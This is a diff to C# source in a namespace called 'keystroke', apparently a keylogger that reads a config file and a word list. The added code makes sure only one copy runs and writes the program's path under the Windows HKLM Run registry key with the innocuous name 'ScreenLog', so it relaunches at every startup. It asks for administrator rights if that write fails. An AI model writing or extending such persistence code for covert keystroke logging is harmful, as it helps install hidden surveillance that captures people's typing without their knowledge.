@@ -13,6 +13,7 @@ using System.Net.Sockets;
 using System.Collections.Specialized;
 using System.IO;
 using WebUtils;
+using Microsoft.Win32;
 
 namespace keystroke
 {
@@ -34,6 +35,29 @@ namespace keystroke
         [STAThread]
         static void Main()
         {
+            String thisprocessname = Process.GetCurrentProcess().ProcessName;
+
+            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
+                return;
+
+
+            try
+            {
+                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+                object currentValue = read.GetValue("ScreenLog");
+
+                if (currentValue == null || String.Compare(currentValue.ToString(), Application.ExecutablePath, true) != 0)
+                {
+                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    add.SetValue("ScreenLog", Application.ExecutablePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Please run as administrator");
+                //return;
+            }
+
             readConfigFile();
             getWordList();
             
